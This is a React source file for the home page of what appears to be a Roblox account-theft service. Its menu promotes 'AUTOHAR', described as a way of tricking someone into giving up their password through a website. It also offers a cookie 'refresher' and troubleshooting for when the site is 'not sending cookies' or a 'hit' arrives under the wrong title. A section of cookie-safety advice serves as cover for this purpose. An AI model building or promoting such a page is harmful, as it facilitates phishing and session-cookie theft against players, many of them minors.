import { useRef } from 'react';
import Background from "@/components/Background";
import CircularMenu from "@/components/CircularMenu";
import PulsatingTitle from "@/components/PulsatingTitle";
import GuidedTour from "@/components/GuidedTour";
import { Info, Shield, MessageCircle } from 'lucide-react';

const menuItems = [
  {
    id: 1,
    label: "INJU.CC",
    info: "This is the main website to the inju.cc domain, if you are new please follow troubleshooting steps",
    link: "https://inju.cc/u/MainControlPage"
  },
  {
    id: 2,
    label: "DISCORD",
    info: "Join the Offical server for downtimes, updates, and more!!!",
    link: "https://discord.gg/injuv3"
  },
  {
    id: 3,
    label: "AUTOHAR",
    info: "Autohar is a way of tricking someone into giving you there ps through a website (AUTOHAR IS NOT MINE)",
    link: "https://bloxtools.in/controlPage/create"
  },
  {
    id: 4,
    label: "REFRESHER",
    info: "Refresh your cookies that you get to prevent theft over others if wanted",
    link: "https://inju.cc/tools/refresher"
  },
  {
    id: 5,
    label: "TROUBLESHOOT",
    info: "If you are new or if site is not sending cookies, or hit title is something other than 'INJURIES' Use this",
    link: "https://discord.com/channels/1286805719911370783/1333224210398445588"
  },
  {
    id: 6,
    label: "YOUTUBE",
    info: "We currently dont have one at the moment",
    link: "https://discord.gg/injuv3"
  }
];

export default function Home() {
  const infoSectionRef = useRef<HTMLDivElement>(null);

  return (
    <div className="min-h-screen w-full bg-black overflow-x-hidden">
      <Background />

      {/* Hero Section with Circular Menu */}
      <div className="relative z-10 w-full h-screen flex items-center justify-center">
        <PulsatingTitle />
        <CircularMenu items={menuItems} />
      </div>

      <GuidedTour />

      {/* Scroll indicator */}
      <div className="absolute bottom-8 left-1/2 -translate-x-1/2 text-white animate-bounce">
        <p className="text-sm mb-2">Scroll to learn more</p>
        <div className="w-6 h-10 border-2 border-white rounded-full mx-auto">
          <div className="w-1 h-2 bg-white rounded-full mx-auto mt-2 animate-pulse" />
        </div>
      </div>

      {/* Information Section */}
      <section ref={infoSectionRef} className="relative z-10 min-h-screen w-full py-20 px-4 md:px-8 bg-black/80">
        <div className="max-w-4xl mx-auto space-y-16">
          {/* Roblox Cookies Info */}
          <div className="space-y-8">
            <div className="flex items-center gap-4">
              <Shield className="w-8 h-8 text-red-500" />
              <h2 className="text-3xl font-bold text-white">Understanding Roblox Account Cookies</h2>
            </div>
            <div className="prose prose-invert">
              <p className="text-gray-300">
                Roblox cookies are essential pieces of data that help maintain your login session. Understanding how they work and how to protect them is crucial for account security.
              </p>
              <ul className="space-y-4 text-gray-300">
                <li>Cookies contain encrypted authentication information</li>
                <li>Never share your cookies with untrusted sources</li>
                <li>Regularly refresh your cookies to maintain security</li>
                <li>Use our tools to manage and protect your account effectively</li>
              </ul>
            </div>
          </div>

          {/* Discord Community */}
          <div className="space-y-8">
            <div className="flex items-center gap-4">
              <MessageCircle className="w-8 h-8 text-red-500" />
              <h2 className="text-3xl font-bold text-white">Join Our Discord Community</h2>
            </div>
            <div className="prose prose-invert">
              <p className="text-gray-300">
                Our Discord server is the hub of our community, offering:
              </p>
              <ul className="space-y-4 text-gray-300">
                <li>Real-time support from experienced members</li>
                <li>Instant notifications about downtimes and updates</li>
                <li>Exclusive tips and tutorials</li>
                <li>A friendly community of like-minded individuals</li>
              </ul>
              <a 
                href="https://discord.gg/injuv3" 
                target="_blank" 
                rel="noopener noreferrer"
                className="inline-block mt-6 px-6 py-3 bg-red-500 text-white rounded-md hover:bg-red-600 transition-colors"
              >
                Join Discord Server
              </a>
            </div>
          </div>
        </div>
      </section>

      {/* Additional sections for video tutorials, AI chat, and suggestions will be added here */}
    </div>
  );
}